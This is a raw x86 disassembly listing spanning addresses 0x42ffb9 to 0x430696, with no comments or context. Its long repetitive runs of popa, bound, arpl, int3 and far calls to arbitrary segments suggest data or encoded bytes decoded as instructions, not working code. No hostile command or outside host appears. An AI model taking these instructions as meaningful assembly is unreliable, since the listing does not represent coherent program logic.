  42ffb9:	xchg   esp,eax
  42ffba:	pop    ss
  42ffbb:	loop   0x42ff87
  42ffbd:	bound  esp,QWORD PTR [edx+0x62]
  42ffc0:	adc    al,0x9d
  42ffc2:	int3   
  42ffc3:	popa   
  42ffc4:	popa   
  42ffc5:	xchg   esp,eax
  42ffc6:	pop    ss
  42ffc7:	loop   0x42ff89
  42ffc9:	bound  esp,QWORD PTR [edx+0x62]
  42ffcc:	adc    al,0xc5
  42ffce:	int3   
  42ffcf:	popa   
  42ffd0:	popa   
  42ffd1:	xchg   esp,eax
  42ffd2:	pop    ss
  42ffd3:	loop   0x42ff8b
  42ffd5:	bound  esp,QWORD PTR [edx+0x62]
  42ffd8:	adc    al,0xaf
  42ffda:	int3   
  42ffdb:	popa   
  42ffdc:	popa   
  42ffdd:	xchg   esp,eax
  42ffde:	pop    ss
  42ffdf:	loop   0x42ff9d
  42ffe1:	bound  esp,QWORD PTR [edx+0x62]
  42ffe4:	adc    al,0xe0
  42ffe6:	int3   
  42ffe7:	popa   
  42ffe8:	popa   
  42ffe9:	xchg   esp,eax
  42ffea:	pop    ss
  42ffeb:	loop   0x43002d
  42ffed:	bound  esp,QWORD PTR [edx+0x62]
  42fff0:	adc    al,0x9e
  42fff2:	int3   
  42fff3:	popa   
  42fff4:	popa   
  42fff5:	xchg   esp,eax
  42fff6:	pop    ss
  42fff7:	loop   0x42ffb1
  42fff9:	bound  esp,QWORD PTR [edx+0x62]
  42fffc:	adc    al,0x34
  42fffe:	int3   
  42ffff:	popa   
  430000:	popa   
  430001:	xchg   esp,eax
  430002:	pop    ss
  430003:	loop   0x42ffd3
  430005:	bound  esp,QWORD PTR [edx+0x62]
  430008:	adc    al,0x38
  43000a:	int3   
  43000b:	popa   
  43000c:	popa   
  43000d:	xchg   esp,eax
  43000e:	pop    ss
  43000f:	loop   0x42ffa5
  430011:	bound  esp,QWORD PTR [edx+0x62]
  430014:	adc    al,0xcc
  430016:	inc    ebp
  430017:	popa   
  430018:	popa   
  430019:	xchg   esp,eax
  43001a:	pop    ss
  43001b:	loop   0x430097
  43001d:	bound  esp,QWORD PTR [edx+0x62]
  430020:	adc    al,0xd3
  430022:	es popa 
  430024:	popa   
  430025:	xchg   esp,eax
  430026:	pop    ss
  430027:	loop   0x430099
  430029:	bound  esp,QWORD PTR [edx+0x62]
  43002c:	adc    al,0xdc
  43002e:	dec    eax
  43002f:	popa   
  430030:	popa   
  430031:	xchg   esp,eax
  430032:	pop    ss
  430033:	loop   0x43001b
  430035:	bound  esp,QWORD PTR [edx+0x62]
  430038:	adc    al,0xdf
  43003a:	xor    DWORD PTR [ecx+0x61],esp
  43003d:	xchg   esp,eax
  43003e:	pop    ss
  43003f:	loop   0x4300ad
  430041:	bound  esp,QWORD PTR [edx+0x62]
  430044:	adc    al,0xa3
  430046:	int3   
  430047:	popa   
  430048:	popa   
  430049:	xchg   esp,eax
  43004a:	pop    ss
  43004b:	loop   0x430038
  43004d:	bound  esp,QWORD PTR [edx+0x62]
  430050:	adc    al,0xc5
  430052:	int3   
  430053:	popa   
  430054:	popa   
  430055:	xchg   esp,eax
  430056:	pop    ss
  430057:	jne    0x430034
  430059:	adc    al,0x34
  43005b:	int3   
  43005c:	popa   
  43005d:	popa   
  43005e:	xchg   esp,eax
  43005f:	pop    ss
  430060:	jne    0x43003b
  430062:	adc    al,0xe0
  430064:	int3   
  430065:	popa   
  430066:	popa   
  430067:	xchg   esp,eax
  430068:	pop    ss
  430069:	jne    0x4300d9
  43006b:	adc    al,0x9c
  43006d:	int3   
  43006e:	popa   
  43006f:	popa   
  430070:	xchg   esp,eax
  430071:	pop    ss
  430072:	jne    0x430029
  430074:	adc    al,0xe5
  430076:	int3   
  430077:	popa   
  430078:	popa   
  430079:	xchg   esp,eax
  43007a:	pop    ss
  43007b:	jne    0x430081
  43007d:	adc    al,0xa8
  43007f:	int3   
  430080:	popa   
  430081:	popa   
  430082:	xchg   esp,eax
  430083:	pop    ss
  430084:	jne    0x4300a0
  430086:	adc    al,0xe6
  430088:	int3   
  430089:	popa   
  43008a:	popa   
  43008b:	xchg   esp,eax
  43008c:	pop    ss
  43008d:	jne    0x43009f
  43008f:	adc    al,0x72
  430091:	int3   
  430092:	popa   
  430093:	popa   
  430094:	xchg   esp,eax
  430095:	pop    ss
  430096:	jne    0x4300a6
  430098:	adc    al,0xe3
  43009a:	int3   
  43009b:	popa   
  43009c:	popa   
  43009d:	xchg   esp,eax
  43009e:	pop    ss
  43009f:	jne    0x4300ad
  4300a1:	adc    al,0x9e
  4300a3:	int3   
  4300a4:	popa   
  4300a5:	popa   
  4300a6:	xchg   esp,eax
  4300a7:	pop    ss
  4300a8:	jne    0x4300bc
  4300aa:	adc    al,0x34
  4300ac:	int3   
  4300ad:	popa   
  4300ae:	popa   
  4300af:	xchg   esp,eax
  4300b0:	pop    ss
  4300b1:	jne    0x43009c
  4300b3:	adc    al,0x38
  4300b5:	int3   
  4300b6:	popa   
  4300b7:	popa   
  4300b8:	xchg   esp,eax
  4300b9:	pop    ss
  4300ba:	jne    0x4300ab
  4300bc:	adc    al,0xcc
  4300be:	inc    ebp
  4300bf:	popa   
  4300c0:	popa   
  4300c1:	xchg   esp,eax
  4300c2:	pop    ss
  4300c3:	jne    0x4300ba
  4300c5:	adc    al,0xd3
  4300c7:	es popa 
  4300c9:	popa   
  4300ca:	xchg   esp,eax
  4300cb:	pop    ss
  4300cc:	jne    0x4300d8
  4300ce:	adc    al,0xdc
  4300d0:	dec    eax
  4300d1:	popa   
  4300d2:	popa   
  4300d3:	xchg   esp,eax
  4300d4:	pop    ss
  4300d5:	jne    0x4300d8
  4300d7:	adc    al,0xdf
  4300d9:	xor    DWORD PTR [ecx+0x61],esp
  4300dc:	xchg   esp,eax
  4300dd:	pop    ss
  4300de:	jne    0x4300e7
  4300e0:	adc    al,0xa3
  4300e2:	int3   
  4300e3:	popa   
  4300e4:	popa   
  4300e5:	xchg   esp,eax
  4300e6:	pop    ss
  4300e7:	jne    0x4300e6
  4300e9:	adc    al,0xdf
  4300eb:	int3   
  4300ec:	popa   
  4300ed:	popa   
  4300ee:	xchg   esp,eax
  4300ef:	pop    ss
  4300f0:	jne    0x430146
  4300f2:	adc    al,0x34
  4300f4:	int3   
  4300f5:	popa   
  4300f6:	popa   
  4300f7:	xchg   esp,eax
  4300f8:	pop    ss
  4300f9:	jne    0x430155
  4300fb:	adc    al,0xe0
  4300fd:	int3   
  4300fe:	popa   
  4300ff:	popa   
  430100:	xchg   esp,eax
  430101:	pop    ss
  430102:	jne    0x430128
  430104:	adc    al,0xaa
  430106:	int3   
  430107:	popa   
  430108:	popa   
  430109:	xchg   esp,eax
  43010a:	pop    ss
  43010b:	jne    0x4300c8
  43010d:	adc    al,0xde
  43010f:	int3   
  430110:	popa   
  430111:	popa   
  430112:	xchg   esp,eax
  430113:	pop    ss
  430114:	jne    0x4300c7
  430116:	adc    al,0xa8
  430118:	int3   
  430119:	popa   
  43011a:	popa   
  43011b:	xchg   esp,eax
  43011c:	pop    ss
  43011d:	jne    0x4300d6
  43011f:	adc    al,0xdd
  430121:	int3   
  430122:	popa   
  430123:	popa   
  430124:	xchg   esp,eax
  430125:	pop    ss
  430126:	jne    0x4300d5
  430128:	adc    al,0x2d
  43012a:	int3   
  43012b:	popa   
  43012c:	popa   
  43012d:	xchg   esp,eax
  43012e:	pop    ss
  43012f:	jne    0x4300e4
  430131:	adc    al,0x13
  430133:	shl    DWORD PTR [ecx+0x61],cl
  430136:	xchg   esp,eax
  430137:	pop    ss
  430138:	jne    0x430142
  43013a:	adc    al,0x38
  43013c:	int3   
  43013d:	popa   
  43013e:	popa   
  43013f:	xchg   esp,eax
  430140:	pop    ss
  430141:	jne    0x430149
  430143:	adc    al,0x34
  430145:	int3   
  430146:	popa   
  430147:	popa   
  430148:	xchg   esp,eax
  430149:	pop    ss
  43014a:	jne    0x430160
  43014c:	adc    al,0x37
  43014e:	int3   
  43014f:	popa   
  430150:	popa   
  430151:	xchg   esp,eax
  430152:	pop    ss
  430153:	jne    0x43017f
  430155:	adc    al,0xcc
  430157:	mul    DWORD PTR [ecx+0x61]
  43015a:	xchg   esp,eax
  43015b:	pop    ss
  43015c:	jne    0x43017e
  43015e:	adc    al,0xdc
  430160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430161:	popa   
  430162:	popa   
  430163:	xchg   esp,eax
  430164:	pop    ss
  430165:	jne    0x430185
  430167:	adc    al,0x83
  430169:	mov    ecx,0x17946161
  43016e:	jne    0x43018c
  430170:	adc    al,0xec
  430172:	outs   dx,DWORD PTR ds:[esi]
  430173:	popa   
  430174:	popa   
  430175:	xchg   esp,eax
  430176:	pop    ss
  430177:	jne    0x43019b
  430179:	adc    al,0xa3
  43017b:	int3   
  43017c:	popa   
  43017d:	popa   
  43017e:	xchg   esp,eax
  43017f:	pop    ss
  430180:	jne    0x43017b
  430182:	adc    al,0xe3
  430184:	int3   
  430185:	popa   
  430186:	popa   
  430187:	xchg   esp,eax
  430188:	pop    ss
  430189:	loop   0x430131
  43018b:	bound  esp,QWORD PTR [edx+0x62]
  43018e:	adc    al,0x34
  430190:	int3   
  430191:	popa   
  430192:	popa   
  430193:	xchg   esp,eax
  430194:	pop    ss
  430195:	loop   0x4301c9
  430197:	bound  esp,QWORD PTR [edx+0x62]
  43019a:	adc    al,0xc5
  43019c:	int3   
  43019d:	popa   
  43019e:	popa   
  43019f:	xchg   esp,eax
  4301a0:	pop    ss
  4301a1:	loop   0x430215
  4301a3:	bound  esp,QWORD PTR [edx+0x62]
  4301a6:	adc    al,0xa1
  4301a8:	int3   
  4301a9:	popa   
  4301aa:	popa   
  4301ab:	xchg   esp,eax
  4301ac:	pop    ss
  4301ad:	loop   0x430157
  4301af:	bound  esp,QWORD PTR [edx+0x62]
  4301b2:	adc    al,0xdc
  4301b4:	int3   
  4301b5:	popa   
  4301b6:	popa   
  4301b7:	xchg   esp,eax
  4301b8:	pop    ss
  4301b9:	loop   0x430159
  4301bb:	bound  esp,QWORD PTR [edx+0x62]
  4301be:	adc    al,0x9d
  4301c0:	int3   
  4301c1:	popa   
  4301c2:	popa   
  4301c3:	xchg   esp,eax
  4301c4:	pop    ss
  4301c5:	loop   0x43014b
  4301c7:	bound  esp,QWORD PTR [edx+0x62]
  4301ca:	adc    al,0x7
  4301cc:	shl    DWORD PTR [ecx+0x61],cl
  4301cf:	xchg   esp,eax
  4301d0:	pop    ss
  4301d1:	loop   0x43017d
  4301d3:	bound  esp,QWORD PTR [edx+0x62]
  4301d6:	adc    al,0x72
  4301d8:	int3   
  4301d9:	popa   
  4301da:	popa   
  4301db:	xchg   esp,eax
  4301dc:	pop    ss
  4301dd:	loop   0x43017f
  4301df:	bound  esp,QWORD PTR [edx+0x62]
  4301e2:	adc    al,0xe1
  4301e4:	int3   
  4301e5:	popa   
  4301e6:	popa   
  4301e7:	xchg   esp,eax
  4301e8:	pop    ss
  4301e9:	loop   0x430181
  4301eb:	bound  esp,QWORD PTR [edx+0x62]
  4301ee:	adc    al,0xa9
  4301f0:	int3   
  4301f1:	popa   
  4301f2:	popa   
  4301f3:	xchg   esp,eax
  4301f4:	pop    ss
  4301f5:	loop   0x430193
  4301f7:	bound  esp,QWORD PTR [edx+0x62]
  4301fa:	adc    al,0x34
  4301fc:	int3   
  4301fd:	popa   
  4301fe:	popa   
  4301ff:	xchg   esp,eax
  430200:	pop    ss
  430201:	loop   0x4301a5
  430203:	bound  esp,QWORD PTR [edx+0x62]
  430206:	adc    al,0x84
  430208:	int3   
  430209:	popa   
  43020a:	popa   
  43020b:	xchg   esp,eax
  43020c:	pop    ss
  43020d:	loop   0x4301a7
  43020f:	bound  esp,QWORD PTR [edx+0x62]
  430212:	adc    al,0xcc
  430214:	mul    DWORD PTR [ecx+0x61]
  430217:	xchg   esp,eax
  430218:	pop    ss
  430219:	loop   0x430247
  43021b:	bound  esp,QWORD PTR [edx+0x62]
  43021e:	adc    al,0xdc
  430220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430221:	popa   
  430222:	popa   
  430223:	xchg   esp,eax
  430224:	pop    ss
  430225:	loop   0x43029b
  430227:	bound  esp,QWORD PTR [edx+0x62]
  43022a:	adc    al,0x83
  43022c:	mov    ecx,0x17946161
  430231:	loop   0x43020d
  430233:	bound  esp,QWORD PTR [edx+0x62]
  430236:	adc    al,0xec
  430238:	outs   dx,DWORD PTR ds:[esi]
  430239:	popa   
  43023a:	popa   
  43023b:	xchg   esp,eax
  43023c:	pop    ss
  43023d:	loop   0x43020f
  43023f:	bound  esp,QWORD PTR [edx+0x62]
  430242:	adc    al,0xa3
  430244:	int3   
  430245:	popa   
  430246:	popa   
  430247:	xchg   esp,eax
  430248:	pop    ss
  430249:	loop   0x430211
  43024b:	bound  esp,QWORD PTR [edx+0x62]
  43024e:	adc    al,0xe7
  430250:	int3   
  430251:	popa   
  430252:	popa   
  430253:	xchg   esp,eax
  430254:	pop    ss
  430255:	jne    0x4302af
  430257:	adc    al,0x34
  430259:	int3   
  43025a:	popa   
  43025b:	popa   
  43025c:	xchg   esp,eax
  43025d:	pop    ss
  43025e:	jne    0x4302a6
  430260:	adc    al,0xde
  430262:	int3   
  430263:	popa   
  430264:	popa   
  430265:	xchg   esp,eax
  430266:	pop    ss
  430267:	jne    0x430291
  430269:	adc    al,0xa3
  43026b:	int3   
  43026c:	popa   
  43026d:	popa   
  43026e:	xchg   esp,eax
  43026f:	pop    ss
  430270:	jne    0x430298
  430272:	adc    al,0x7a
  430274:	int3   
  430275:	popa   
  430276:	popa   
  430277:	xchg   esp,eax
  430278:	pop    ss
  430279:	jne    0x4302cb
  43027b:	adc    al,0x72
  43027d:	int3   
  43027e:	popa   
  43027f:	popa   
  430280:	xchg   esp,eax
  430281:	pop    ss
  430282:	jne    0x4302c2
  430284:	adc    al,0xe1
  430286:	int3   
  430287:	popa   
  430288:	popa   
  430289:	xchg   esp,eax
  43028a:	pop    ss
  43028b:	jne    0x4302c9
  43028d:	adc    al,0x2e
  43028f:	int3   
  430290:	popa   
  430291:	popa   
  430292:	xchg   esp,eax
  430293:	pop    ss
  430294:	jne    0x4302d8
  430296:	adc    al,0x34
  430298:	int3   
  430299:	popa   
  43029a:	popa   
  43029b:	xchg   esp,eax
  43029c:	pop    ss
  43029d:	jne    0x4302e7
  43029f:	adc    al,0x2d
  4302a1:	int3   
  4302a2:	popa   
  4302a3:	popa   
  4302a4:	xchg   esp,eax
  4302a5:	pop    ss
  4302a6:	jne    0x4302de
  4302a8:	adc    al,0x0
  4302aa:	das    
  4302ab:	popa   
  4302ac:	popa   
  4302ad:	xchg   esp,eax
  4302ae:	pop    ss
  4302af:	jne    0x4302c9
  4302b1:	adc    al,0x7
  4302b3:	jae    0x430316
  4302b5:	popa   
  4302b6:	xchg   esp,eax
  4302b7:	pop    ss
  4302b8:	jne    0x4302d0
  4302ba:	adc    al,0x1
  4302bc:	jmp    0x43031f
  4302be:	popa   
  4302bf:	xchg   esp,eax
  4302c0:	pop    ss
  4302c1:	jne    0x4302b6
  4302c3:	adc    al,0x19
  4302c5:	push   ecx
  4302c6:	popa   
  4302c7:	popa   
  4302c8:	xchg   esp,eax
  4302c9:	pop    ss
  4302ca:	jne    0x4302bd
  4302cc:	adc    al,0xdd
  4302ce:	fbld   TBYTE PTR [ecx+0x61]
  4302d1:	xchg   esp,eax
  4302d2:	pop    ss
  4302d3:	jne    0x430339
  4302d5:	adc    al,0xd1
  4302d7:	jno    0x43033a
  4302d9:	popa   
  4302da:	xchg   esp,eax
  4302db:	pop    ss
  4302dc:	jne    0x4302cb
  4302de:	adc    al,0x9c
  4302e0:	int3   
  4302e1:	popa   
  4302e2:	popa   
  4302e3:	xchg   esp,eax
  4302e4:	pop    ss
  4302e5:	jne    0x430318
  4302e7:	or     eax,0x6262e7e2
  4302ec:	bound  ecx,QWORD PTR ds:0x616850db
  4302f2:	popa   
  4302f3:	or     eax,0x17610d61
  4302f8:	loop   0x4302dd
  4302fa:	bound  esp,QWORD PTR [edx+0x62]
  4302fd:	push   DWORD PTR [ebp+0x60]
  430300:	cmp    al,0xff
  430302:	jne    0x43035b
  430304:	dec    ecx
  430305:	push   DWORD PTR [ebp+0x4e]
  430308:	push   DWORD PTR ss:[ebp+0x4d]
  43030c:	and    al,0xff
  43030e:	jne    0x43035c
  430310:	mov    al,0xff
  430312:	jne    0x430367
  430314:	loopne 0x430315
  430316:	jne    0x430381
  430318:	in     eax,dx
  430319:	push   DWORD PTR [ebp+0x30]
  43031c:	repz push DWORD PTR [ebp+0x67]
  430320:	inc    edx
  430321:	push   DWORD PTR [ebp+0x5e]
  430324:	lock push DWORD PTR [ebp+0x55]
  430328:	and    al,0xff
  43032a:	jne    0x430388
  43032c:	mov    al,0xff
  43032e:	jne    0x430393
  430330:	loopne 0x430331
  430332:	loop   0x4302e5
  430334:	arpl   WORD PTR [edx+0x62],sp
  430337:	repz jmp edx
  43033a:	lods   al,BYTE PTR ds:[esi]
  43033b:	arpl   WORD PTR [edx+0x62],sp
  43033e:	xor    eax,0x63b7e2ff
  430343:	bound  esp,QWORD PTR [edx-0x3e]
  430346:	jmp    edx
  430348:	mov    edx,0x64626263
  43034d:	jmp    edx
  43034f:	lods   eax,DWORD PTR ds:[esi]
  430350:	arpl   WORD PTR [edx+0x62],sp
  430353:	notrack jmp edx
  430356:	das    
  430357:	arpl   WORD PTR [edx+0x62],sp
  43035a:	out    dx,al
  43035b:	jmp    edx
  43035d:	mov    bl,0x63
  43035f:	bound  esp,QWORD PTR [edx+0x36]
  430362:	jmp    edx
  430364:	and    eax,0xe0626263
  430369:	or     eax,0xb859a75
  43036e:	call   0xa8e8:0x5e343ac9
  430375:	popa   
  430376:	pop    ss
  430377:	loop   0x43039d
  430379:	arpl   WORD PTR [edx+0x62],sp
  43037c:	out    dx,al
  43037d:	xchg   DWORD PTR ds:0xb858675,ecx
  430383:	call   0x6324:0x130d3ac9
  43038a:	bound  esp,QWORD PTR [edx+0x13]
  43038d:	outs   dx,BYTE PTR ds:[esi]
  43038e:	push   0x61a8e85e
  430393:	pop    ss
  430394:	loop   0x4303ba
  430396:	arpl   WORD PTR [edx+0x62],sp
  430399:	fsub   DWORD PTR [ebx]
  43039b:	and    al,0x63
  43039d:	bound  esp,QWORD PTR [edx+0x3b]
  4303a0:	jae    0x430325
  4303a2:	or     eax,0x626324e2
  4303a7:	bound  edx,QWORD PTR [ebx+0x60342c06]
  4303ad:	test   eax,ebx
  4303af:	popa   
  4303b0:	popa   
  4303b1:	popa   
  4303b2:	fcomp  DWORD PTR [edx+ebx*4]
  4303b5:	or     eax,0x62632413
  4303ba:	bound  eax,QWORD PTR [esp+ebp*1]
  4303bd:	lea    esp,[eax-0x12]
  4303c0:	and    ecx,DWORD PTR ds:0xb859a75
  4303c6:	call   0xa8e8:0x5e343ac9
  4303cd:	popa   
  4303ce:	pop    ss
  4303cf:	loop   0x430425
  4303d1:	arpl   WORD PTR [edx+0x62],sp
  4303d4:	out    dx,al
  4303d5:	xchg   DWORD PTR ds:0xb858675,ecx
  4303db:	call   0x6354:0x130d3ac9
  4303e2:	bound  esp,QWORD PTR [edx+0x13]
  4303e5:	outs   dx,BYTE PTR ds:[esi]
  4303e6:	push   0x61a8e85e
  4303eb:	pop    ss
  4303ec:	loop   0x430442
  4303ee:	arpl   WORD PTR [edx+0x62],sp
  4303f1:	fsub   DWORD PTR [ebx]
  4303f3:	push   esp
  4303f4:	arpl   WORD PTR [edx+0x62],sp
  4303f7:	cmp    dh,BYTE PTR [ebx-0x7d]
  4303fa:	or     eax,0x626354e2
  4303ff:	bound  edx,QWORD PTR [ebx+0x69342c06]
  430405:	test   eax,ebx
  430407:	popa   
  430408:	popa   
  430409:	popa   
  43040a:	fcomp  DWORD PTR [edx+ebx*4]
  43040d:	or     eax,0x62635413
  430412:	bound  eax,QWORD PTR [esp+ebp*1]
  430415:	lea    ebp,[ecx-0x12]
  430418:	and    ecx,DWORD PTR ds:0xb859a75
  43041e:	call   0xa8e8:0x5e343ac9
  430425:	popa   
  430426:	pop    ss
  430427:	loop   0x430426
  430429:	arpl   WORD PTR [edx+0x62],sp
  43042c:	out    dx,al
  43042d:	xchg   DWORD PTR ds:0xb858675,ecx
  430433:	call   0x63fd:0x130d3ac9
  43043a:	bound  esp,QWORD PTR [edx+0x13]
  43043d:	outs   dx,BYTE PTR ds:[esi]
  43043e:	push   0x61a8e85e
  430443:	pop    ss
  430444:	loop   0x430443
  430446:	arpl   WORD PTR [edx+0x62],sp
  430449:	fsub   DWORD PTR [ebx]
  43044b:	std    
  43044c:	arpl   WORD PTR [edx+0x62],sp
  43044f:	call   0x63fd:0xe20dd573
  430456:	bound  esp,QWORD PTR [edx-0x6d]
  430459:	push   es
  43045a:	outs   dx,BYTE PTR ds:[esi]
  43045b:	xor    al,0xb1
  43045d:	arpl   WORD PTR [edx+0x62],sp
  430460:	test   eax,ebx
  430462:	popa   
  430463:	popa   
  430464:	popa   
  430465:	fcomp  DWORD PTR [edx+ebx*4]
  430468:	or     eax,0x6263fd13
  43046d:	bound  eax,QWORD PTR [esi+ebp*2]
  430470:	lea    esi,[ecx-0x119d9d9d]
  430476:	repnz adc esi,DWORD PTR [ebp+0x5d]
  43047a:	pop    ss
  43047b:	loop   0x430474
  43047d:	bound  esp,QWORD PTR [edx+0x62]
  430480:	or     eax,0x6262f7e2
  430485:	bound  esp,QWORD PTR [ecx]
  430487:	popa   
  430488:	in     eax,dx
  430489:	push   ebp
  43048a:	(bad)  
  43048b:	ins    DWORD PTR es:[edi],dx
  43048c:	(bad)  
  43048d:	jmp    0x936d:0x8f55ed5d
  430494:	loop   0x430468
  430496:	push   0x5bd86161
  43049b:	jmp    0x430500
  43049d:	bound  esp,QWORD PTR [edx+0x61]
  4304a0:	and    edx,esp
  4304a2:	out    0x63,eax
  4304a4:	bound  esp,QWORD PTR [edx-0x10]
  4304a7:	inc    ebx
  4304a8:	xor    al,0x3a
  4304aa:	adc    al,0xe8
  4304ac:	int3   
  4304ad:	popa   
  4304ae:	popa   
  4304af:	xchg   esp,eax
  4304b0:	pop    ss
  4304b1:	loop   0x430492
  4304b3:	arpl   WORD PTR [edx+0x62],sp
  4304b6:	adc    al,0x34
  4304b8:	int3   
  4304b9:	popa   
  4304ba:	popa   
  4304bb:	xchg   esp,eax
  4304bc:	pop    ss
  4304bd:	loop   0x43049c
  4304bf:	arpl   WORD PTR [edx+0x62],sp
  4304c2:	adc    al,0xe3
  4304c4:	int3   
  4304c5:	popa   
  4304c6:	popa   
  4304c7:	xchg   esp,eax
  4304c8:	pop    ss
  4304c9:	loop   0x4304a6
  4304cb:	arpl   WORD PTR [edx+0x62],sp
  4304ce:	adc    al,0xa7
  4304d0:	int3   
  4304d1:	popa   
  4304d2:	popa   
  4304d3:	xchg   esp,eax
  4304d4:	pop    ss
  4304d5:	loop   0x4304b0
  4304d7:	arpl   WORD PTR [edx+0x62],sp
  4304da:	adc    al,0xe1
  4304dc:	int3   
  4304dd:	popa   
  4304de:	popa   
  4304df:	xchg   esp,eax
  4304e0:	pop    ss
  4304e1:	loop   0x430551
  4304e3:	arpl   WORD PTR [edx+0x62],sp
  4304e6:	adc    al,0xa3
  4304e8:	int3   
  4304e9:	popa   
  4304ea:	popa   
  4304eb:	xchg   esp,eax
  4304ec:	pop    ss
  4304ed:	loop   0x4304a4
  4304ef:	arpl   WORD PTR [edx+0x62],sp
  4304f2:	adc    al,0xf
  4304f4:	shl    DWORD PTR [ecx+0x61],cl
  4304f7:	xchg   esp,eax
  4304f8:	pop    ss
  4304f9:	loop   0x4304ff
  4304fb:	arpl   WORD PTR [edx+0x62],sp
  4304fe:	adc    al,0x96
  430500:	int3   
  430501:	popa   
  430502:	popa   
  430503:	xchg   esp,eax
  430504:	pop    ss
  430505:	loop   0x430521
  430507:	arpl   WORD PTR [edx+0x62],sp
  43050a:	adc    al,0xe6
  43050c:	int3   
  43050d:	popa   
  43050e:	popa   
  43050f:	xchg   esp,eax
  430510:	pop    ss
  430511:	loop   0x430523
  430513:	arpl   WORD PTR [edx+0x62],sp
  430516:	adc    al,0x72
  430518:	int3   
  430519:	popa   
  43051a:	popa   
  43051b:	xchg   esp,eax
  43051c:	pop    ss
  43051d:	loop   0x43052d
  43051f:	arpl   WORD PTR [edx+0x62],sp
  430522:	adc    al,0x34
  430524:	int3   
  430525:	popa   
  430526:	popa   
  430527:	xchg   esp,eax
  430528:	pop    ss
  430529:	loop   0x430537
  43052b:	arpl   WORD PTR [edx+0x62],sp
  43052e:	adc    al,0xa9
  430530:	int3   
  430531:	popa   
  430532:	popa   
  430533:	xchg   esp,eax
  430534:	pop    ss
  430535:	loop   0x430549
  430537:	arpl   WORD PTR [edx+0x62],sp
  43053a:	adc    al,0xcc
  43053c:	mul    DWORD PTR [ecx+0x61]
  43053f:	xchg   esp,eax
  430540:	pop    ss
  430541:	loop   0x43052c
  430543:	arpl   WORD PTR [edx+0x62],sp
  430546:	adc    al,0xdc
  430548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430549:	popa   
  43054a:	popa   
  43054b:	xchg   esp,eax
  43054c:	pop    ss
  43054d:	loop   0x43053e
  43054f:	arpl   WORD PTR [edx+0x62],sp
  430552:	adc    al,0x83
  430554:	mov    ecx,0x17946161
  430559:	loop   0x430550
  43055b:	arpl   WORD PTR [edx+0x62],sp
  43055e:	adc    al,0xec
  430560:	outs   dx,DWORD PTR ds:[esi]
  430561:	popa   
  430562:	popa   
  430563:	xchg   esp,eax
  430564:	pop    ss
  430565:	loop   0x430571
  430567:	arpl   WORD PTR [edx+0x62],sp
  43056a:	adc    al,0xa3
  43056c:	int3   
  43056d:	popa   
  43056e:	popa   
  43056f:	xchg   esp,eax
  430570:	pop    ss
  430571:	loop   0x430574
  430573:	arpl   WORD PTR [edx+0x62],sp
  430576:	or     eax,0xb858675
  43057b:	call   0xa8e8:0x5e343ac9
  430582:	popa   
  430583:	pop    ss
  430584:	loop   0x43059a
  430586:	arpl   WORD PTR [edx+0x62],sp
  430589:	or     eax,0xb859a75
  43058e:	call   0x24e2:0x6e213ac9
  430595:	dec    esi
  430596:	push   edi
  430597:	popa   
  430598:	bound  esp,QWORD PTR [edx+0x61]
  43059b:	popa   
  43059c:	adc    esp,edx
  43059e:	adc    al,0x63
  4305a0:	bound  esp,QWORD PTR [edx-0x2e]
  4305a3:	or     eax,0xb858675
  4305a8:	call   0xa8e8:0x5e343ac9
  4305af:	popa   
  4305b0:	rcl    BYTE PTR [ebx],cl
  4305b2:	loop   0x430593
  4305b4:	arpl   WORD PTR [edx+0x62],sp
  4305b7:	ror    BYTE PTR ds:0x6262e7e2,cl
  4305bd:	bound  ecx,QWORD PTR ds:0x6168f5db
  4305c3:	popa   
  4305c4:	bound  esi,QWORD PTR [edx+0xd]
  4305c7:	jne    0x43055b
  4305c9:	bound  ebx,QWORD PTR [eax+0x17]
  4305cc:	loop   0x4305b1
  4305ce:	arpl   WORD PTR [edx+0x62],sp
  4305d1:	fsub   DWORD PTR [ebx]
  4305d3:	jecxz  0x430638
  4305d5:	bound  esp,QWORD PTR [edx+0x61]
  4305d8:	out    0x93,eax
  4305da:	clc    
  4305db:	cmp    al,0x76
  4305dd:	test   DWORD PTR [ebp+eax*4+0x98b9759],0xf7763cf6
  4305e8:	mov    WORD PTR ds:0x6262e7e2,cs
  4305ee:	bound  ecx,QWORD PTR ds:0x616810db
  4305f4:	popa   
  4305f5:	or     eax,0x6fd69acd
  4305fa:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  430600:	pop    esi
  430601:	call   0x9ae467ae
  430606:	xchg   ebx,eax
  430607:	loop   0x43063d
  430609:	xor    al,0x61
  43060b:	popa   
  43060c:	or     eax,0xb859a75
  430611:	call   0xa8e8:0x5e343ac9
  430618:	popa   
  430619:	or     eax,0x6262e713
  43061e:	bound  ecx,QWORD PTR ds:0x6168df17
  430624:	popa   
  430625:	pop    ss
  430626:	push   0x859a750d
  43062b:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  430631:	call   0x135067de
  430636:	out    0x62,eax
  430638:	bound  esp,QWORD PTR [edx+0xd]
  43063b:	pop    ss
  43063c:	fld    TBYTE PTR [eax+0x61]
  43063f:	popa   
  430640:	pop    ss
  430641:	push   0x63bee2ff
  430646:	bound  esp,QWORD PTR [edx-0xd]
  430649:	jmp    edx
  43064b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43064c:	arpl   WORD PTR [edx+0x62],sp
  43064f:	xor    eax,0x63a4e2ff
  430654:	bound  esp,QWORD PTR [edx-0x3e]
  430657:	jmp    edx
  430659:	retf   
  43065a:	arpl   WORD PTR [edx+0x62],sp
  43065d:	fs jmp edx
  430660:	retf   0x6263
  430663:	bound  edi,QWORD PTR [esi]
  430665:	jmp    edx
  430667:	shl    DWORD PTR [ebx+0x62],0x62
  43066b:	out    dx,al
  43066c:	jmp    edx
  43066e:	shl    BYTE PTR [ebx+0x62],0x62
  430672:	ss jmp edx
  430675:	(bad)  
  430676:	arpl   WORD PTR [edx+0x62],sp
  430679:	loopne 0x43068f
  43067b:	jp     0x430649
  43067d:	popa   
  43067e:	popa   
  43067f:	xchg   esp,eax
  430680:	pop    ss
  430681:	loop   0x4306cf
  430683:	pop    esp
  430684:	bound  esp,QWORD PTR [edx+0x14]
  430687:	xor    al,0xcc
  430689:	popa   
  43068a:	popa   
  43068b:	xchg   esp,eax
  43068c:	pop    ss
  43068d:	loop   0x4306e1
  43068f:	pop    esp
  430690:	bound  esp,QWORD PTR [edx+0x14]
  430693:	jecxz  0x430661
  430695:	popa   
  430696:	popa   
